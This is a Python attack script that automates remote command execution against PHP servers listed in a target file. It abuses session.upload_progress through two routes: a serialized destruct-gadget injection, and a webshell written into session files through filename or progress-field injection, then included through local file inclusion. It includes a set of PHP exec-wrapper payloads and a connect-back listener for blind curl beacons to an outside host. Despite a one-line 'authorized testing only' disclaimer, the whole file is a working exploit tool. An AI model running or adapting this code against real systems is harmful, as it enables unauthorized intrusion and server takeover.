#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = []
# ///
"""Blind command runner over the PHP session.upload_progress chains.

Tries every technique that can run a command on the target, sequentially,
across all hosts listed in urls.txt, and stops at the first technique that
gives evidence of execution. The command is supplied with --cmd.

Techniques (tried per host, in order):
  1. chain C — serialized destruct gadget, proof via ==PROOF== echo or the
     proof file (--docker); this one returns output, so the result is shown
  2. chain C — same gadget, blind: builds the command into a connect-back
     beacon (--beacon template) and waits for the listener
  3. chain A — webshell via filename injection + LFI include
     (verifiable marker first, then the command itself, then the beacon)
  4. chain A — one-shot payloads: 6 exec wrappers x 2 injection vectors

The command must be quote-free friendly: it is embedded in single quotes
inside the PHP payload for the filename vector. Commands containing double
quotes switch to a progress-value webshell (no quoting limits) instead.

Beacon: --beacon is optional here. If given (e.g. 'curl <IP_ADDRESS>:8000')
it is used as the blind connect-back; without it the script relies on
output/proof evidence only.

Usage:
  uv run run_cmd.py --cmd 'id' --docker p2s2-lab
  uv run run_cmd.py --cmd 'id' --beacon 'curl <IP_ADDRESS>:8000'
  uv run run_cmd.py --cmd 'id' --hosts other.txt --a-lfi-path /vuln.php

Targets are read from --hosts (default urls.txt) and processed one after
the other. Exit code 0 only when the command executed on every target.

For authorized testing only.
"""
import argparse
import os
import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse, quote

B = "RUNCMDBOUND"

WRAPPERS = [
    ("system", "system('{c}');"),
    ("passthru", "passthru('{c}');"),
    ("shell_exec", "echo shell_exec('{c}');"),
    ("exec", "exec('{c}',$o);echo implode(chr(10),$o);"),
    ("popen", "$h=popen('{c}','r');while(!feof($h))echo fgets($h);"),
    ("backtick", "echo `{c}`;"),
]

WRITE_CANDIDATES = ["/chainA/index.php", "/chainW/up.php", "/", "/index.php",
                    "/upload.php", "/contact.php"]
LFI_CANDIDATES = [("/chainA/lfi.php", "page"), ("/index.php", "page"),
                  ("/index.php", "file"), ("/index.php", "include"),
                  ("/lfi.php", "page"), ("/vuln.php", "page")]
CW_CANDIDATES = ["/chainW/up.php"]
CR_CANDIDATES = ["/chainR/up.php"]


# ------------------------------------------------------------------ transport
def send(host, port, method, path, body=b"", headers="", scheme="http",
         timeout=10.0, verify=False):
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return None
    if scheme == "https":
        ctx = ssl.create_default_context()
        if not verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        try:
            sock = ctx.wrap_socket(sock, server_hostname=host)
        except (ssl.SSLError, OSError):
            sock.close()
            return None
    try:
        h = host if port in (80, 443) else f"{host}:{port}"
        hdr = (f"{method} {path} HTTP/1.1\r\nHost: {h}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n{headers}\r\n").encode()
        sock.sendall(hdr + body)
        sock.settimeout(timeout)
        resp = b""
        while True:
            try:
                d = sock.recv(65536)
                if not d:
                    break
                resp += d
            except socket.timeout:
                break
        return resp
    except OSError:
        return None
    finally:
        sock.close()


def multipart(host, port, path, sid, progress, filename, **kw):
    body = (
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\n'
        f"Z\r\n--{B}--\r\n"
    ).encode("latin-1")
    return send(host, port, "POST", path, body,
                f"Content-Type: multipart/form-data; boundary={B}\r\n", **kw)


def status_of(resp):
    try:
        return int(resp.split(b" ", 2)[1])
    except (IndexError, ValueError):
        return 0


def body_of(resp):
    return resp.partition(b"\r\n\r\n")[2].decode("latin-1", "replace")


def docker_exec(container, cmd):
    import subprocess
    try:
        r = subprocess.run(["docker", "exec", container, "bash", "-c", cmd],
                           capture_output=True, text=True, timeout=30)
    except (OSError, subprocess.TimeoutExpired):
        return ""
    return (r.stdout + r.stderr).strip()


def parse_target(line):
    line = line.split("#", 1)[0].strip()
    if not line:
        return None
    if "://" not in line:
        line = "http://" + line
    u = urlparse(line)
    scheme = (u.scheme or "http").lower()
    if scheme not in ("http", "https") or not u.hostname:
        return None
    return (scheme, u.hostname, u.port or (443 if scheme == "https" else 80))


# ------------------------------------------------------------------ beacon
class Listener:
    """Tiny connect-back listener; not required unless --beacon is given."""

    def __init__(self, port):
        self.port = port
        self.hits = {}
        self.ok = False

    def start(self):
        import threading
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.sock.bind(("0.0.0.0", self.port))
        except OSError:
            return
        self.sock.settimeout(0.3)
        self.sock.listen(32)
        self.ok = True
        threading.Thread(target=self._loop, daemon=True).start()

    def _loop(self):
        while True:
            try:
                c, addr = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            try:
                d = c.recv(1024)
                c.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 9\r\n\r\nBEACON-OK")
            except OSError:
                d = b""
            finally:
                c.close()
            line = d.split(b"\r\n", 1)[0].decode("latin-1", "replace")
            self.hits[(addr[0], line)] = time.time()

    def new_since(self, ts):
        return [k for k, t in self.hits.items() if t >= ts]

    def stop(self):
        if self.ok:
            self.sock.close()


# ------------------------------------------------------------------ helpers
def extract(resp, mk=None):
    """Return command output. With a marker, cut everything before it."""
    if not resp:
        return ""
    out = body_of(resp)
    m = re.search(r"==PROOF==\r?\n(.*?)==/PROOF==", out, re.S)
    if m:
        proof = m.group(1).strip()
        if mk and mk in proof:
            return proof.split(mk, 1)[1].lstrip("\r\n").strip()
        return proof
    if mk:
        i = out.find(mk)
        if i < 0:
            return ""
        return out[i + len(mk):].splitlines()[0].strip() if out[i + len(mk):].splitlines() else ""
    return ""


# ------------------------------------------------------------------ chain C
def gadget_for(cmd, cls, prop):
    cb, pb, nb = (x.encode("latin-1", "replace") for x in (cls, prop, cmd))
    g = (f'X|O:{len(cb)}:"'.encode() + cb + b'":1:{s:' + str(len(pb)).encode()
         + b':"' + pb + b'";s:' + str(len(nb)).encode() + b':"' + nb + b'";}')
    return g.decode("latin-1")


def try_chain_c(t, args, cmd):
    scheme, host, port = t
    cw = args.c_write_path or next(
        (c for c in CW_CANDIDATES
         if status_of(send(host, port, "GET", c, scheme=scheme,
                           timeout=args.timeout, verify=args.verify_tls) or b"") == 200), None)
    cr = args.c_read_path or next(
        (c for c in CR_CANDIDATES
         if status_of(send(host, port, "GET", c, scheme=scheme,
                           timeout=args.timeout, verify=args.verify_tls) or b"") == 200), None)
    if not (cw and cr):
        return None
    if args.docker:
        docker_exec(args.docker, f"rm -f {args.output_path}")
    sid = "rc" + os.urandom(6).hex()
    mk = "RUN42-" + os.urandom(3).hex()
    multipart(host, port, cw, sid, gadget_for(f"echo {mk}; {cmd}", args.gadget, args.gadget_prop),
              "n.txt", scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
    r = multipart(host, port, cr, sid, "x", "n.txt",
                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
    out = extract(r, mk)
    if not out and args.docker:
        time.sleep(0.5)
        out = docker_exec(args.docker, f"cat {args.output_path} 2>/dev/null")
        if mk in out:
            out = out.split(mk, 1)[1].lstrip("\r\n").strip()
    return out


# ------------------------------------------------------------------ chain A
def try_chain_a(t, args, cmd, single_quote_only=False):
    scheme, host, port = t
    mk = "RUN42-" + os.urandom(3).hex()
    # webshell stores the command, single-quote only; the progress-value
    # variant has no quoting limits, so a strict shell pass avoids the
    # filename truncation for commands containing double quotes
    if single_quote_only:
        php = f"<?php echo '{mk}';system({chr(36)}_GET['c']);?>"
    else:
        php = f"<?php echo '{mk}';system('{cmd}');?>"

    for wp in (args.a_write_path and [args.a_write_path] or WRITE_CANDIDATES):
        sid = "ra" + os.urandom(6).hex()
        sess = f"{args.save_path}/sess_{sid}"
        if single_quote_only:
            if multipart(host, port, wp, sid, php, "n.txt", scheme=scheme,
                         timeout=args.timeout, verify=args.verify_tls) is None:
                continue
        else:
            if multipart(host, port, wp, sid, "x", php, scheme=scheme,
                         timeout=args.timeout, verify=args.verify_tls) is None:
                continue
        for lp, param in (args.a_lfi_path and [(args.a_lfi_path, args.a_lfi_param)]
                          or LFI_CANDIDATES):
            url = f"{lp}?{param}={quote(sess)}"
            if single_quote_only:
                url += f"&c={quote(cmd)}"
            r = send(host, port, "GET", url,
                     scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
            if not (r and mk in body_of(r)):
                continue
            out = extract(r, mk)
            return out if out is not None else "(no output)"
    return None


def try_chain_a_matrix(t, args, cmd):
    """one-shot payloads, 6 wrappers x 2 vectors"""
    scheme, host, port = t
    for wp in (args.a_write_path and [args.a_write_path] or WRITE_CANDIDATES):
        for lp, param in (args.a_lfi_path and [(args.a_lfi_path, args.a_lfi_param)]
                          or LFI_CANDIDATES):
            for name, tpl in WRAPPERS:
                for vec in ("filename", "progress"):
                    mk = "RUN42-" + os.urandom(3).hex()
                    php = "<?php echo '%s';%s ?>" % (mk, tpl.format(c=cmd))
                    sid = "rm" + os.urandom(6).hex()
                    sess = f"{args.save_path}/sess_{sid}"
                    if vec == "filename":
                        multipart(host, port, wp, sid, "x", php, scheme=scheme,
                                  timeout=args.timeout, verify=args.verify_tls)
                    else:
                        multipart(host, port, wp, sid, php, "n.txt", scheme=scheme,
                                  timeout=args.timeout, verify=args.verify_tls)
                    r = send(host, port, "GET", f"{lp}?{param}={quote(sess)}",
                             scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
                    if not (r and mk in body_of(r)):
                        continue
                    out = extract(r, mk)
                    return f"[{name}/{vec}] {out if out is not None else '(no output)'}"
    return None


# ------------------------------------------------------------------ driver
def run_host(t, args, listener):
    scheme, host, port = t
    label = f"{scheme}://{host}:{port}"
    print(f"\n=== {label}")

    if args.beacon:
        ts = time.time()
        # 1. chain C with output
        out = try_chain_c(t, args, args.cmd)
        if out:
            print(f"[+] chain C (gadget) executed — output:\n{out}\n")
            return True
        print("[-] chain C: no output")
        # 2. chain C blind via beacon
        bcmd = args.beacon.replace("<TAG>", "rc-" + os.urandom(2).hex())
        out = try_chain_c(t, args, bcmd)
        time.sleep(args.settle)
        hits = listener.new_since(ts)
        if hits:
            print(f"[+] chain C blind beacon: {hits[:2]}\n")
            return True
        print("[-] chain C blind: no beacon")

    # 3. chain A webshell (verifiable output)
    strict = '"' in args.cmd
    out = try_chain_a(t, args, args.cmd, single_quote_only=strict)
    if out:
        how = "webshell+LFI (progress-value webshell, double quotes ok)" if strict \
            else "webshell+LFI (filename webshell)"
        print(f"[+] chain A {how} executed — output:\n{out}\n")
        return True
    print("[-] chain A webshell: no output")

    # 3b. chain A webshell with the beacon command
    if args.beacon:
        ts = time.time()
        bcmd = args.beacon.replace("<TAG>", "ra-" + os.urandom(2).hex())
        try_chain_a(t, args, bcmd)
        time.sleep(args.settle)
        hits = listener.new_since(ts)
        if hits:
            print(f"[+] chain A blind beacon: {hits[:2]}\n")
            return True
        print("[-] chain A blind: no beacon")

    # 4. full one-shot matrix
    out = try_chain_a_matrix(t, args, args.cmd)
    if out:
        print(f"[+] chain A matrix executed — {out}\n")
        return True
    print("[-] chain A matrix: nothing\n")
    return False


def main():
    ap = argparse.ArgumentParser(description="Blind command runner for upload-progress chains")
    ap.add_argument("--cmd", required=True, help="command to execute on the target")
    ap.add_argument("--hosts", default="urls.txt", help="target file (default urls.txt)")
    ap.add_argument("--beacon", help="optional connect-back beacon, e.g. 'curl <IP_ADDRESS>:8000'; "
                                     "'<TAG>' placeholder avoids collisions")
    ap.add_argument("--listen-port", type=int, default=8000)
    ap.add_argument("--settle", type=float, default=2.0)
    ap.add_argument("--docker", metavar="CONTAINER", help="read proof file via docker exec")
    ap.add_argument("--a-write-path", default=None)
    ap.add_argument("--a-lfi-path", default=None, help="fixed LFI endpoint (skip probing)")
    ap.add_argument("--a-lfi-param", default="page")
    ap.add_argument("--c-write-path", default=None)
    ap.add_argument("--c-read-path", default=None)
    ap.add_argument("--gadget", default="Evil")
    ap.add_argument("--gadget-prop", default="cmd")
    ap.add_argument("--output-path", default="/tmp/rce_proof")
    ap.add_argument("--save-path", default="/tmp/sess")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--verify-tls", action="store_true")
    args = ap.parse_args()

    if "\n" in args.cmd or "\r" in args.cmd:
        ap.error("--cmd must be single-line")

    try:
        with open(args.hosts, encoding="utf-8") as f:
            lines = f.read().splitlines()
    except OSError as e:
        print(f"[-] cannot read {args.hosts}: {e}", file=sys.stderr)
        sys.exit(2)
    targets = [t for t in (parse_target(l) for l in lines) if t]
    if not targets:
        print(f"[-] no targets in {args.hosts}", file=sys.stderr)
        sys.exit(2)

    listener = Listener(args.listen_port) if args.beacon else None
    if listener:
        listener.start()
        if not listener.ok:
            print(f"[!] cannot bind :{args.listen_port} — blind beacons disabled",
                  file=sys.stderr)
            listener = None

    print(f"[*] cmd: {args.cmd}")
    print(f"[*] {len(targets)} target(s) from {args.hosts}, sequential")
    print("[*] authorized testing only\n")

    ok = 0
    try:
        for t in targets:
            try:
                if run_host(t, args, listener):
                    ok += 1
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print(f"[-] {t}: error {e.__class__.__name__}: {e}\n")
    finally:
        if listener:
            listener.stop()
    print(f"[*] executed on {ok}/{len(targets)} target(s)")
    sys.exit(0 if ok == len(targets) else 1)


if __name__ == "__main__":
    main()
